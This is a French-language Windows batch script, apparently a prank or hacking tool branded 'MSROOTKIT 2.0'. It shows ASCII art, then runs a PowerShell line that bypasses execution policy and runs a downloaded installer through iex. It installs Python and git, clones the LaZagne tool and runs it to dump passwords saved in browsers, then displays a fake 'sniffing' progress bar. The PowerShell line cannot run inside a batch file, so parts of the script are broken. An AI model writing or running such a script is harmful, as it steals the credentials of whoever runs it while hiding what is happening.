color D
cls

@echo off

echo Bienvenue sur MSROOTKIT...
echo "                                                                          ";
echo " _______   .__          .__       __      _____                           ";
echo " \      \  |__|   ____  |  |__  _/  |_   /     \    ____    ____    ____  ";
echo " /   |   \ |  |  / ___\ |  |  \ \   __\ /  \ /  \  /  _ \  /  _ \  /    \ ";
echo "/    |    \|  | / /_/  >|   Y  \ |  |  /    Y    \(  <_> )(  <_> )|   |  \";
echo "\____|__  /|__| \___  / |___|  / |__|  \____|__  / \____/  \____/ |___|  /";
echo "        \/     /_____/       \/                \/                      \/ ";
echo
echo                       -odNMMMMMMMMMMMMMMMMMMNh+-           MSROOTKIT 2.0
echo                     :hMMMMMMMMMMMMMMMMMMMMMMMMMMmo.  
echo                     :hMMMMMMMMMMMMMMMMMMMMMMMMMMmo.
echo                     :hMMMM    MMMMMMMMMM    MMMMmo.
echo                     :hMMM MMMMMMMMMMMMMMMMMM MMMmo.
echo                     :hMMMMMMMMMMMMMMMMMMMMMMMMMMmo.
echo                     :hMMMM     MMMMMMMM     MMMMmo.
echo                     :hMMM MMMMMMMMMMMMMMMMMM MMMmo.
echo                     :hMMMMMMMMMMMMMMMMMMMMMMMMMMmo.
echo                     :hMMMMMMMMMMMMMMMMMMMMMMMMMMmo.
echo                     :hMM MMMMMMMMMMMMMMMMMMM MMMmo.
echo                     :hMMMM                  MMMMmo.
echo                     :hMMMMM                MMMMMmo.
echo                     :hMMMMMMMMMMMMMMMMMMMMMMMMMMmo.
echo                     :hMMMMMMMMMMMM  MMMMMMMMMMMMmo.
echo                     :hMMMMMMMMMMM    MMMMMMMMMMMmo.
echo                     :hMMMM MMMMM      MMMMMMMMMMmo.
echo                     :hMMMM MMMMMMM  MMM MMMMMMMMmo.
echo                     :hMMMM MMMMMMM  MM M MMMMMMMmo.
echo                     :hMMMMM MMMMMM  M MMM  MMMMMmo.
echo                     :hMMMMMM  MMMM   MMMMMM  MMMmo.
echo                     :hMMMMMMMM  MM  MMMMMM MMMMMmo.
echo                     :hMMMMMMMMMM    MMMMM MMMMMMmo.
echo                        -odNMMMMMMM  MMMM MMMMNh+-
echo                             dMM/NMM/NMN/MMM/
echo                             hMM/mMM/NMN+MMM-
echo                             yMM/  M/N  +MMM.
echo                             oMM:hMM-NMh+MMN
echo                             /MM:yMM`mMo+MMd
echo                              -+`+hy sd.-ys:                       
cls
color 4

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
timeout 5
choco install pip
choco install python3
choco install git
timeout 5
git clone https://github.com/AlessandroZ/LaZagne.git
timeout 3
cd LaZagne
pip install -r requirements.txt
timeout 3
cd Windows
python laZagne.py browsers

cls

@echo off
echo
echo SNIFFING EN COURS ...
@echo off
ping 0.0.0.0 -n 1 >nul
echo .10%
ping 0.0.0.0 -n 1 >nul
echo ..20%
ping 0.0.0.0 -n 1 >nul
echo ...30%
ping 0.0.0.0 -n 1 >nul
echo ....40%
ping 0.0.0.0 -n 1 >nul
echo .....50%
ping 0.0.0.0 -n 1 >nul
echo ......60%
ping 0.0.0.0 -n 1 >nul
echo .......70%
ping 0.0.0.0 -n 1 >nul
echo ........80%
ping 0.0.0.0 -n 1 >nul
echo .........90%
ping 0.0.0.0 -n 1 >nul
echo ..........100%
ping 0.0.0.0 -n 1 >nul
@echo off
echo

echo !! 	Copie r�ussie 100% !!

ping 0.0.0.0 -n 3 >nul



echo Fermeture MSROOTKIT...

exit